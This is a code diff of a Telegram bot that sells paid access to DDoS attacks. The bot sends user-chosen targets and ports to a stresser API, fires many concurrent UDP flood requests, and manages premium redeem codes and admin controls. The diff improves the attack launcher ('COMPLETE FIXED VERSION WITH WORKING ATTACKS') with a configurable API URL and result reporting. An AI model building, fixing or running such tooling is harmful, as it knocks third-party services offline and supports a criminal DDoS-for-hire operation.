@@ -1,4 +1,4 @@
-# app.py - COMPLETE FIXED VERSION WITH USER REVOCATION ON DELETE
+# app.py - COMPLETE FIXED VERSION WITH WORKING ATTACKS
 import os
 import logging
 import asyncio
@@ -26,6 +26,7 @@ load_dotenv()
 # ===== CONFIGURATION =====
 TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
 API_KEY = os.getenv("API_KEY")
+API_URL = os.getenv("API_URL", "https://api.susstresser.com/panel/api/api.php")  # Make this configurable
 MONGO_URI = os.getenv("MONGO_URI")
 OWNER_ID = int(os.getenv("OWNER_ID", "123456789"))
 PSEUDO_OWNER_ID = int(os.getenv("PSEUDO_OWNER_ID", "987654321"))
@@ -153,15 +154,13 @@ class Database:
                     logger.info(f"DEBUG: User {user_id} parsed expiry: {expiry}")
                 except Exception as e:
                     logger.error(f"DEBUG: Error parsing expiry for {user_id}: {e}")
-                    # Don't reset to free, keep as premium with invalid expiry
                     return "premium", None
             
             # Check if expired
             if expiry and isinstance(expiry, datetime):
                 if expiry < datetime.now():
-                    logger.info(f"DEBUG: User {user_id} plan expired at {expiry}, resetting to free")
-                    # Don't auto-reset here, let it be handled explicitly
-                    return "premium", expiry  # Return expired but still premium
+                    logger.info(f"DEBUG: User {user_id} plan expired at {expiry}")
+                    return "premium", expiry
                 else:
                     logger.info(f"DEBUG: User {user_id} has valid premium until {expiry}")
                     return "premium", expiry
@@ -172,9 +171,8 @@ class Database:
         return plan, expiry
     
     def update_user_plan(self, user_id, plan, expiry):
-        """Update user plan - FIXED"""
+        """Update user plan"""
         if not self.memory_mode:
-            # Convert datetime to string for MongoDB, or None for lifetime
             expiry_str = expiry.isoformat() if expiry and isinstance(expiry, datetime) else None
             result = self.users.update_one(
                 {"user_id": user_id},
@@ -230,7 +228,6 @@ class Database:
                 "added_by": added_by,
                 "added_at": datetime.now()
             })
-            # Give lifetime premium to admins
             self.update_user_plan(user_id, "premium", None)
             return True
         else:
@@ -318,7 +315,6 @@ class Database:
             self.users[user_id]["last_attack_duration"] = duration
     
     def create_code(self, code, days, created_by):
-        """Create a new redeem code"""
         if not self.memory_mode:
             if self.codes.find_one({"code": code}):
                 return False
@@ -345,36 +341,29 @@ class Database:
             return True
     
     def use_code(self, code, user_id):
-        """Redeem a code - COMPLETELY FIXED"""
         if not self.memory_mode:
-            # Find unused code
             code_data = self.codes.find_one({"code": code, "is_used": False})
             if not code_data:
                 logger.warning(f"❌ Code {code} not found or already used")
                 return None
             
-            # Mark code as used
             self.codes.update_one(
                 {"code": code},
                 {"$set": {"is_used": True, "used_by": user_id, "used_at": datetime.now()}}
             )
             
-            # Calculate expiry
             days = code_data['access_days']
-            if days >= 3650:  # Lifetime
+            if days >= 3650:
                 expiry = None
             else:
                 expiry = datetime.now() + timedelta(days=days)
             
-            # CRITICAL FIX: Make sure user exists first
             if not self.get_user(user_id):
                 logger.info(f"User {user_id} not found, creating...")
                 self.add_user(user_id)
             
-            # Update user with premium plan - DIRECT UPDATE
             expiry_str = expiry.isoformat() if expiry else None
             
-            # Force update with $set
             result = self.users.update_one(
                 {"user_id": user_id},
                 {"$set": {
@@ -390,30 +379,9 @@ class Database:
             
             if result.matched_count > 0:
                 logger.info(f"✅ SUCCESS: User {user_id} redeemed code {code} - Plan: premium, Expiry: {expiry_str}")
-                
-                # Double-check the update worked
-                verify_user = self.get_user(user_id)
-                if verify_user:
-                    verify_plan = verify_user.get('plan')
-                    verify_expiry = verify_user.get('plan_expiry')
-                    logger.info(f"✅ VERIFICATION: User {user_id} now has plan={verify_plan}, expiry={verify_expiry}")
-                    
-                    if verify_plan != "premium":
-                        logger.error(f"❌ CRITICAL: Plan didn't persist! Retrying...")
-                        # Retry with upsert
-                        self.users.update_one(
-                            {"user_id": user_id},
-                            {"$set": {"plan": "premium", "plan_expiry": expiry_str}},
-                            upsert=True
-                        )
-                        verify_user2 = self.get_user(user_id)
-                        if verify_user2:
-                            logger.info(f"✅ RETRY: User {user_id} now has plan={verify_user2.get('plan')}")
-                
                 return code_data
             else:
                 logger.error(f"❌ User {user_id} not found or update failed")
-                # Try to create and update
                 self.add_user(user_id)
                 result2 = self.users.update_one(
                     {"user_id": user_id},
@@ -433,7 +401,6 @@ class Database:
                     logger.error(f"❌ Failed to create/update user {user_id}")
                     return None
         else:
-            # Memory mode
             if code in self.codes and not self.codes[code]["is_used"]:
                 code_data = self.codes[code]
                 code_data["is_used"] = True
@@ -453,7 +420,6 @@ class Database:
         return None
     
     def get_user_by_code(self, code):
-        """Find which user used a specific code"""
         if not self.memory_mode:
             return self.users.find_one({"code_used": code})
         else:
@@ -463,11 +429,9 @@ class Database:
         return None
 
     def revoke_user_plan_by_code(self, code):
-        """Revoke premium plan from user who used a specific code"""
         user = self.get_user_by_code(code)
         if user:
             user_id = user['user_id']
-            # Only revoke if it's not an admin (admins keep lifetime premium)
             if not self.is_admin(user_id):
                 self.update_user_plan(user_id, "free", None)
                 logger.info(f"✅ Revoked premium from user {user_id} after code {code} was deleted")
@@ -476,14 +440,6 @@ class Database:
                 logger.info(f"⚠️ Admin {user_id} used code {code}, keeping premium")
                 return False
         return False
-
-    def revoke_all_users_by_codes(self, codes):
-        """Revoke premium from all users who used the given codes"""
-        revoked = 0
-        for code in codes:
-            if self.revoke_user_plan_by_code(code):
-                revoked += 1
-        return revoked
     
     def get_codes(self, only_unused=False):
         if not self.memory_mode:
@@ -576,7 +532,6 @@ def init_owner():
     if plan != "premium":
         db.update_user_plan(OWNER_ID, "premium", None)
 
-# ===== INITIALIZE PSEUDO_OWNER =====
 def init_pseudo_owner():
     if PSEUDO_OWNER_ID and PSEUDO_OWNER_ID != 0 and PSEUDO_OWNER_ID != OWNER_ID:
         pseudo_owner = db.get_user(PSEUDO_OWNER_ID)
@@ -770,12 +725,11 @@ async def send_attack_alert(attack_info):
     except Exception as e:
         logger.error(f"Alert error: {e}")
 
-# ===== API ATTACK =====
-async def send_api_attack(target, port, duration, attack_num):
-    url = "https://api.susstresser.com/panel/api/api.php"
-    
+# ===== API ATTACK - FIXED =====
+async def send_api_attack(target, port, duration, attack_num, api_key, api_url):
+    """Send single API attack request"""
     params = {
-        "key": API_KEY,
+        "key": api_key,
         "host": target,
         "port": port,
         "time": duration,
@@ -790,62 +744,101 @@ async def send_api_attack(target, port, duration, attack_num):
     }
     
     try:
-        timeout = aiohttp.ClientTimeout(total=duration + 15)
+        timeout = aiohttp.ClientTimeout(total=duration + 10)
         async with aiohttp.ClientSession(timeout=timeout) as session:
             start_time = time.time()
-            async with session.get(url, params=params, headers=headers) as response:
+            
+            async with session.get(api_url, params=params, headers=headers) as response:
                 elapsed = time.time() - start_time
-                result_text = await response.text()
+                response_text = await response.text()
                 
-                if response.status == 200:
-                    return {
-                        "success": True,
-                        "attack_num": attack_num,
-                        "status": response.status,
-                        "elapsed": f"{elapsed:.2f}s"
-                    }
-                else:
-                    return {
-                        "success": False,
-                        "attack_num": attack_num,
-                        "status": response.status,
-                        "elapsed": f"{elapsed:.2f}s"
-                    }
+                logger.info(f"Attack {attack_num}: Status={response.status}, Time={elapsed:.2f}s")
+                
+                return {
+                    "success": response.status == 200,
+                    "attack_num": attack_num,
+                    "status": response.status,
+                    "elapsed": f"{elapsed:.2f}s",
+                    "response": response_text[:100]
+                }
                     
+    except asyncio.TimeoutError:
+        logger.error(f"Attack {attack_num} timed out")
+        return {
+            "success": False,
+            "attack_num": attack_num,
+            "error": "Timeout"
+        }
     except Exception as e:
         logger.error(f"Attack {attack_num} failed: {e}")
         return {
             "success": False,
             "attack_num": attack_num,
-            "error": str(e)
+            "error": str(e)[:50]
         }
 
-# ===== 20 CONCURRENT ATTACKS =====
-async def send_20_concurrent_attacks(target, port, duration, user_id, context):
+# ===== CONCURRENT ATTACKS - FIXED =====
+async def send_concurrent_attacks(target, port, duration, user_id, context):
+    """Send multiple concurrent attacks"""
     logger.info(f"🚀 Launching {MAX_CONCURRENT} concurrent UDP attacks on {target}:{port}")
+    
+    api_key = os.getenv("API_KEY")
+    api_url = os.getenv("API_URL", "https://api.susstresser.com/panel/api/api.php")
+    
+    if not api_key:
+        logger.error("❌ API_KEY not set!")
+        await context.bot.send_message(
+            chat_id=user_id,
+            text="❌ *API KEY MISSING*\n\nAPI key is not configured!\nPlease contact the bot owner.",
+            parse_mode='Markdown'
+        )
+        return None
     
     status_msg = await context.bot.send_message(
         chat_id=user_id,
-        text=f"🔥 *ATTACK RUNNING*\n\n"
+        text=f"🔥 *ATTACK STARTING*\n\n"
              f"🎯 Target: `{target}:{port}`\n"
              f"⏱️ Duration: `{duration}s`\n"
              f"⚡ Attacks: `{MAX_CONCURRENT} CONCURRENT`\n"
-             f"⏳ Time Remaining: `{duration}s`\n\n"
-             f"🔄 Attack in progress...",
+             f"🔄 Sending requests...",
         parse_mode='Markdown'
     )
     
+    # Create all tasks
     tasks = []
     for i in range(1, MAX_CONCURRENT + 1):
-        task = send_api_attack(target, port, duration, i)
+        task = send_api_attack(target, port, duration, i, api_key, api_url)
         tasks.append(task)
     
+    # Start timer update task
     timer_task = asyncio.create_task(update_timer(status_msg, duration, target, port))
-    results = await asyncio.gather(*tasks)
+    
+    # Run all tasks concurrently
+    start_time = time.time()
+    results = await asyncio.gather(*tasks, return_exceptions=True)
+    elapsed = time.time() - start_time
+    
     timer_task.cancel()
     
-    success_count = sum(1 for r in results if r.get('success', False))
+    # Process results
+    success_count = 0
+    failed_count = 0
+    result_details = []
     
+    for r in results:
+        if isinstance(r, Exception):
+            failed_count += 1
+            result_details.append(f"❌ {str(r)[:30]}")
+        elif isinstance(r, dict):
+            if r.get('success', False):
+                success_count += 1
+                result_details.append(f"✅ Attack {r.get('attack_num', '?')} - {r.get('elapsed', 'N/A')}")
+            else:
+                failed_count += 1
+                error = r.get('error', r.get('response', 'Unknown error'))
+                result_details.append(f"❌ Attack {r.get('attack_num', '?')} - {error[:30]}")
+    
+    # Create final message
     cooldown = attack_manager.get_cooldown_time(duration)
     
     final_text = (
@@ -853,10 +846,16 @@ async def send_20_concurrent_attacks(target, port, duration, user_id, context):
         f"🎯 Target: `{target}:{port}`\n"
         f"⏱️ Duration: `{duration}s`\n"
         f"✅ Successful: `{success_count}/{MAX_CONCURRENT}`\n"
+        f"❌ Failed: `{failed_count}/{MAX_CONCURRENT}`\n"
+        f"⏱️ Total Time: `{elapsed:.2f}s`\n"
         f"⚡ Status: {'✅ COMPLETED' if success_count > 0 else '❌ FAILED'}\n\n"
         f"⏳ Cooldown: {cooldown}s\n"
-        f"⏳ Next attack available in: `{cooldown}s`"
+        f"⏳ Next attack in: `{cooldown}s`\n\n"
+        f"📊 *Results:*\n" + "\n".join(result_details[:5])
     )
+    
+    if len(result_details) > 5:
+        final_text += f"\n... and {len(result_details) - 5} more"
     
     await status_msg.edit_text(final_text, parse_mode='Markdown')
     
@@ -864,6 +863,7 @@ async def send_20_concurrent_attacks(target, port, duration, user_id, context):
         "success": success_count > 0,
         "total_attacks": len(results),
         "successful": success_count,
+        "failed": failed_count,
         "results": results,
         "target": target,
         "port": port,
@@ -871,6 +871,7 @@ async def send_20_concurrent_attacks(target, port, duration, user_id, context):
     }
 
 async def update_timer(status_msg, duration, target, port):
+    """Update the attack timer in the message"""
     try:
         start_time = time.time()
         last_update = 0
@@ -882,7 +883,7 @@ async def update_timer(status_msg, duration, target, port):
             if remaining <= 0:
                 break
             
-            if int(elapsed) % 5 == 0 and int(elapsed) != last_update:
+            if int(elapsed) % 3 == 0 and int(elapsed) != last_update:
                 last_update = int(elapsed)
                 try:
                     await status_msg.edit_text(
@@ -890,12 +891,13 @@ async def update_timer(status_msg, duration, target, port):
                         f"🎯 Target: `{target}:{port}`\n"
                         f"⏱️ Duration: `{duration}s`\n"
                         f"⚡ Attacks: `{MAX_CONCURRENT} CONCURRENT`\n"
-                        f"⏳ Time Remaining: `{remaining}s`\n\n"
+                        f"⏳ Time Remaining: `{remaining}s`\n"
+                        f"⏱️ Elapsed: `{int(elapsed)}s`\n\n"
                         f"🔄 Attack in progress...",
                         parse_mode='Markdown'
                     )
-                except:
-                    pass
+                except Exception as e:
+                    logger.error(f"Timer update error: {e}")
             
             await asyncio.sleep(1)
             
@@ -904,12 +906,18 @@ async def update_timer(status_msg, duration, target, port):
     except Exception as e:
         logger.error(f"Timer update error: {e}")
 
-# ===== CHECK API STATUS =====
+# ===== CHECK API STATUS - FIXED =====
 async def check_api_status():
+    """Check if the API is working"""
     try:
-        url = "https://api.susstresser.com/panel/api/api.php"
+        api_url = os.getenv("API_URL", "https://api.susstresser.com/panel/api/api.php")
+        api_key = os.getenv("API_KEY")
+        
+        if not api_key:
+            return False, "❌ API_KEY not configured!"
+        
         params = {
-            "key": API_KEY,
+            "key": api_key,
             "host": "8.8.8.8",
             "port": 53,
             "time": 1,
@@ -919,14 +927,18 @@ async def check_api_status():
         timeout = aiohttp.ClientTimeout(total=10)
         async with aiohttp.ClientSession(timeout=timeout) as session:
             start_time = time.time()
-            async with session.get(url, params=params) as response:
+            async with session.get(api_url, params=params) as response:
                 elapsed = time.time() - start_time
+                response_text = await response.text()
+                
                 if response.status == 200:
                     return True, f"✅ Connected (Response: {elapsed:.2f}s)"
                 elif response.status == 503:
-                    return False, "⚠️ API is temporarily unavailable (503 Service Unavailable)\nPlease try again later."
+                    return False, "⚠️ API is temporarily unavailable (503)"
                 else:
                     return False, f"❌ Error (Status: {response.status})"
+    except asyncio.TimeoutError:
+        return False, "❌ Connection timeout - API is not responding"
     except Exception as e:
         return False, f"❌ Connection Failed: {str(e)[:50]}"
 
@@ -1068,15 +1080,15 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         attack_id = attack_manager.start_attack(user_id, target, port, duration, "udp", 0)
         
-        result = await send_20_concurrent_attacks(target, port, duration, user_id, context)
+        result = await send_concurrent_attacks(target, port, duration, user_id, context)
         
-        attack_info = db.log_attack(
-            user_id, target, port, duration, "udp",
-            "success" if result.get('success') else "failed",
-            str(result)
-        )
-        
-        await send_attack_alert(attack_info)
+        if result:
+            attack_info = db.log_attack(
+                user_id, target, port, duration, "udp",
+                "success" if result.get('success') else "failed",
+                str(result)
+            )
+            await send_attack_alert(attack_info)
         
         attack_manager.stop_attack(attack_id)
         attack_manager.cleanup()
@@ -1188,15 +1200,15 @@ async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         attack_id = attack_manager.start_attack(user_id, target, port, duration, "udp", 0)
         
-        result = await send_20_concurrent_attacks(target, port, duration, user_id, context)
+        result = await send_concurrent_attacks(target, port, duration, user_id, context)
         
-        attack_info = db.log_attack(
-            user_id, target, port, duration, "udp",
-            "success" if result.get('success') else "failed",
-            str(result)
-        )
-        
-        await send_attack_alert(attack_info)
+        if result:
+            attack_info = db.log_attack(
+                user_id, target, port, duration, "udp",
+                "success" if result.get('success') else "failed",
+                str(result)
+            )
+            await send_attack_alert(attack_info)
         
         attack_manager.stop_attack(attack_id)
         attack_manager.cleanup()
@@ -1407,9 +1419,8 @@ async def admin_list_callback(update: Update, context: ContextTypes.DEFAULT_TYPE
         reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]])
     )
 
-# ===== DELETE FUNCTIONS - COMPLETELY FIXED WITH USER REVOCATION =====
+# ===== DELETE FUNCTIONS =====
 async def admin_delete_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Show unused codes to delete"""
     query = update.callback_query
     await query.answer()
     
@@ -1444,7 +1455,6 @@ async def admin_delete_callback(update: Update, context: ContextTypes.DEFAULT_TY
     )
 
 async def admin_delete_used_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Show used codes to delete with user info"""
     query = update.callback_query
     await query.answer()
     
@@ -1471,7 +1481,6 @@ async def admin_delete_used_callback(update: Update, context: ContextTypes.DEFAU
         used_by = c.get('used_by', 'Unknown')
         duration_text = "LIFETIME" if c['access_days'] >= 3650 else f"{c['access_days']}d"
         
-        # Get user info
         user = db.get_user(used_by)
         username = f"@{user.get('username', 'Unknown')}" if user else "Unknown"
         
@@ -1493,14 +1502,12 @@ async def admin_delete_used_callback(update: Update, context: ContextTypes.DEFAU
     )
 
 async def process_delete_unused_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Process delete unused code - No user revocation needed since codes are unused"""
     query = update.callback_query
     await query.answer()
     
     data = query.data
     
     if data == "delallunused":
-        # Delete all unused codes
         unused_codes = db.get_codes(only_unused=True)
         deleted = 0
         for c in unused_codes:
@@ -1513,7 +1520,6 @@ async def process_delete_unused_callback(update: Update, context: ContextTypes.D
         )
         return
     
-    # Delete single unused code
     code = data.replace('delunused_', '')
     if db.delete_code(code):
         await query.edit_message_text(
@@ -1528,24 +1534,20 @@ async def process_delete_unused_callback(update: Update, context: ContextTypes.D
         )
 
 async def process_delete_used_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Process delete used code - Revoke user's premium plan"""
     query = update.callback_query
     await query.answer()
     
     data = query.data
     
     if data == "delallused":
-        # Delete all used codes and revoke plans
         used_codes = [c for c in db.get_codes(only_unused=False) if c.get('is_used', False)]
         revoked = 0
         deleted = 0
         
         for c in used_codes:
             code = c['code']
-            # Revoke user's plan
             if db.revoke_user_plan_by_code(code):
                 revoked += 1
-            # Delete the code
             if db.delete_code(code):
                 deleted += 1
         
@@ -1557,13 +1559,9 @@ async def process_delete_used_callback(update: Update, context: ContextTypes.DEF
         )
         return
     
-    # Delete single used code
     code = data.replace('delused_', '')
-    
-    # First revoke user's plan
     revoked = db.revoke_user_plan_by_code(code)
     
-    # Then delete the code
     if db.delete_code(code):
         message = f"✅ Used code `{code}` deleted!\n"
         if revoked:
@@ -1629,6 +1627,7 @@ async def owner_api_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"🔌 API STATUS\n\n"
         f"{message}\n\n"
         f"📊 API Key: {'✅ Set' if API_KEY else '❌ Missing'}\n"
+        f"📊 API URL: {os.getenv('API_URL', 'Not set')}\n"
         f"🔄 Method: UDP\n"
         f"⚡ Concurrent: {MAX_CONCURRENT}x\n"
         f"⏱️ Duration: {MIN_DURATION}-{MAX_DURATION}s\n"
@@ -1999,9 +1998,8 @@ async def owner_banned_users(update: Update, context: ContextTypes.DEFAULT_TYPE)
         reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]])
     )
 
-# ===== REDEEM COMMAND - COMPLETELY FIXED =====
+# ===== REDEEM COMMAND =====
 async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle redeem command - COMPLETELY FIXED with better debugging"""
     user_id = update.effective_user.id
     
     args = context.args
@@ -2017,7 +2015,6 @@ async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     code = args[0].upper()
     
-    # Check if user already redeemed
     user = db.get_user(user_id)
     if user and user.get('has_used_code'):
         plan, expiry = db.get_user_plan(user_id)
@@ -2034,16 +2031,13 @@ async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 )
                 return
     
-    # Try to use the code
     logger.info(f"📝 User {user_id} trying to redeem code: {code}")
     result = db.use_code(code, user_id)
     
     if result:
-        # Get the updated user plan immediately
         plan, expiry = db.get_user_plan(user_id)
         logger.info(f"✅ AFTER REDEEM: User {user_id} - Plan: {plan}, Expiry: {expiry}")
         
-        # Double-check with direct database query
         direct_user = db.get_user(user_id)
         if direct_user:
             logger.info(f"✅ DIRECT DB CHECK: User {user_id} - Plan: {direct_user.get('plan')}, Expiry: {direct_user.get('plan_expiry')}")
@@ -2169,7 +2163,7 @@ def run_bot():
     app.add_handler(CallbackQueryHandler(stats_callback, pattern="^stats$"))
     app.add_handler(CallbackQueryHandler(back_callback, pattern="^back$"))
     
-    # Admin - Updated handlers
+    # Admin
     app.add_handler(CallbackQueryHandler(admin_callback, pattern="^admin$"))
     app.add_handler(CallbackQueryHandler(admin_gen_callback, pattern="^admin_gen$"))
     app.add_handler(CallbackQueryHandler(process_gen_callback, pattern="^gen_"))
@@ -2177,7 +2171,7 @@ def run_bot():
     app.add_handler(CallbackQueryHandler(admin_delete_callback, pattern="^admin_delete$"))
     app.add_handler(CallbackQueryHandler(admin_delete_used_callback, pattern="^admin_delete_used$"))
     
-    # Delete handlers - Updated patterns
+    # Delete handlers
     app.add_handler(CallbackQueryHandler(process_delete_unused_callback, pattern="^delunused_"))
     app.add_handler(CallbackQueryHandler(process_delete_unused_callback, pattern="^delallunused$"))
     app.add_handler(CallbackQueryHandler(process_delete_used_callback, pattern="^delused_"))
